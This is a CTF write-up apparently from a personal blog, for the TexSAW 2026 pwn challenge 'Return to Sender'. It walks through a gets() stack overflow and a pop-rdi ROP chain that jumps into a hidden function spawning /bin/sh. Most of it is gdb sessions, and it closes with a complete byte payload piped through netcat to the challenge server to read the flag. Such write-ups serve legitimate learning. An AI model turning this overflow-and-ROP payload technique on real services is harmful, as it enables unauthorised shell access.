---
layout: post
title: TexSAW 2026 - Return to Sender (PWN)
date: 2026-03-30
description: Privilege escalation and skip of a security test
tags: writeups pwn texsawctf ROP
categories: writeups pwn
author: "Guillaume"
---

## Challenge Overview

- **Name of the CTF Event:** TexSAW 2026
- **Challenge Name:** Return to Sender
- **Category:** Pwn
- **Provided Files / URL:** `chall`, `nc 143.198.163.4 15858`
- **Goal:** Find the flag.

## Initial Analysis

I started by importing the binary file into Ghidra where I was able to identify 6 functions :

- `avenue`, `boulevard` and `court` : those only print a string.
- `deliver` : uses `gets` to get an input and uses that input to launch one of the previous functions or none of them if the input isn't correct -> possible overflow.
- `drive` : a function opening a shell if the parameter contains the right value. However, this function is never called, so calling it is my first goal.
- `main` : clears IO buffers then launches `deliver`.
- `tool` : does apparently nothing.

# Solution Path

## Step 1: Getting into the `drive` function

Since I know that I can overflow with the input in `deliver`, I launched gdb to view the state of the stack after entering the input to see what I could override.

```bash
(gdb) x/16x $sp
0x7fffffffe0e0:	0x00000061	0x00000000	0xffffe258	0x00007fff
0x7fffffffe0f0:	0x00000001	0x00000000	0xf7ffd000	0x00007fff
0x7fffffffe100:	0xffffe120	0x00007fff	0x004013c0	0x00000000
0x7fffffffe110:	0xffffe258	0x00007fff	0x00000000	0x00000001
```

Here we can see the only `a` I inputted at the first byte after the stack pointer and 40 bytes after the stack pointer there is `0x004013c0`, this is the return address, so by changing it to the address of `drive` (`0x401211`) I should be able to access it.
I tried this hypothesis directly in gdb :

```
(gdb) set {int}($sp + 40) = 0x401211
(gdb) n
Single stepping until exit from function deliver,
which has no line number information.
Sorry, we couldn't deliver your package. Returning to sender...

0x0000000000401211 in drive ()
(gdb)
```

So this works very well, but now I need to call the function with the right parameter to go into this `if` :

```C
if (param_1 == 0x48435344) {
	puts("Success! Secret package delivered.\n");
	system("/bin/sh");
}
```

## Step 2: Calling `drive` with `0x48435344` as parameter

Since unfortunately functions parameters are in registers and not in the stack I need to find a way to put a value from the stack into `RDI` the register containing the parameter that I need. To do so I need something like the assembly instruction `POP RDI`, very conveniently the assembly code of the function `tool` is :

```asm
ENDBR64
PUSH     RBP
MOV      RBP,RSP
POP      RDI
RET
```

So now I need to call this function with `0x48435344` at the top of the stack after the call and override the return address once more to get into `drive`.

To keep track of the stack, I inputted `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN` to fill up the first 40 bytes after the stack pointer, changed the address at `$sp + 40` to the address of `tool` (`0x4011b6`) and then printed the registers just after exiting `tool` :

```
0x00000000004012a2 in deliver ()
(gdb)
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN
0x00000000004012a7 in deliver ()
(gdb) set {int}($sp + 40) = 0x4011b6
(gdb) x/16x $sp
0x7fffffffe0e0:	0x64636261	0x68676665	0x6c6b6a69	0x706f6e6d
0x7fffffffe0f0:	0x74737271	0x78777675	0x42417a79	0x46454443
0x7fffffffe100:	0x4a494847	0x4e4d4c4b	0x004011b6	0x00000000
0x7fffffffe110:	0xffffe258	0x00007fff	0x00000000	0x00000001
(gdb) n
Single stepping until exit from function deliver,
which has no line number information.
Sorry, we couldn't deliver your package. Returning to sender...

0x00000000004011b6 in tool ()
(gdb) n
Single stepping until exit from function tool,
which has no line number information.
0x00007fffffffe258 in ?? ()
(gdb) info reg
...
rdi            0x4e4d4c4b4a494847  5642249794417674311
```

So after `tool`, we are now in `0x00007fffffffe258` which correspond the 8 bytes starting at `$sp + 48` in `deliver` and rdi is containing `0x4e4d4c4b4a494847` which correspond to the 8 bytes starting at `$sp + 32`.

I can now quickly verify in gdb these offsets are the correct ones :

```
0x00000000004012a7 in deliver ()
(gdb) set {int}($sp + 32) = 0x48435344
(gdb) set {int}($sp + 36) = 0x0
(gdb) set {int}($sp + 40) = 0x4011b6
(gdb) set {int}($sp + 48) = 0x401211
(gdb) set {int}($sp + 52) = 0x0
(gdb) x/16x $sp
0x7fffffffe0e0:	0x00000061	0x00000000	0xffffe258	0x00007fff
0x7fffffffe0f0:	0x00000001	0x00000000	0xf7ffd000	0x00007fff
0x7fffffffe100:	0x48435344	0x00000000	0x004011b6	0x00000000
0x7fffffffe110:	0x00401211	0x00000000	0x00000000	0x00000001
(gdb) n
Single stepping until exit from function deliver,
which has no line number information.
Sorry, we couldn't deliver your package. Returning to sender...

0x00000000004011b6 in tool ()
(gdb)
Single stepping until exit from function tool,
which has no line number information.
0x0000000000401211 in drive ()
(gdb)
Single stepping until exit from function drive,
which has no line number information.
Attempting secret delivery to 3 Dangerous Drive...

Success! Secret package delivered.

[Detaching after vfork from child process 281986]
sh-5.3$
```

This indeed allows us to get into the `if` and to get a shell.

# Exploit

I only need to craft a payload and pipe it to netcat to get the flag.

I started with this payload (with some addresses written in reverse because the CPU is in little endian) :

```bash
print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x53\x43\x48\x00\x00\x00\x00\xb6\x11\x40\x00\x00\x00\x00\x00\x11\x12\x40\x00\x00\x00\x00\x00\ncat flag.txt\n" | nc 143.198.163.4 15858
Our modern and highly secure postal service never fails to deliver your package.

Where would you like to send your package?

Some Options:
0 Address Avenue
1 Buffer Boulevard
2 Canary Court

Sorry, we couldn t deliver your package. Returning to sender...

Attempting secret delivery to 3 Dangerous Drive...

Success! Secret package delivered.

ls
ls
pwd
^C
```

It was kind of successful but the shell wasn't registering my inputs, so I added them directly into the payload :

```bash
print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x53\x43\x48\x00\x00\x00\x00\xb6\x11\x40\x00\x00\x00\x00\x00\x11\x12\x40\x00\x00\x00\x00\x00\nls\n" | nc 143.198.163.4 15858

...

flag.txt
run
```

```bash
print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x53\x43\x48\x00\x00\x00\x00\xb6\x11\x40\x00\x00\x00\x00\x00\x11\x12\x40\x00\x00\x00\x00\x00\ncat flag.txt\n" | nc 143.198.163.4 15858

...

texsaw{...}
```
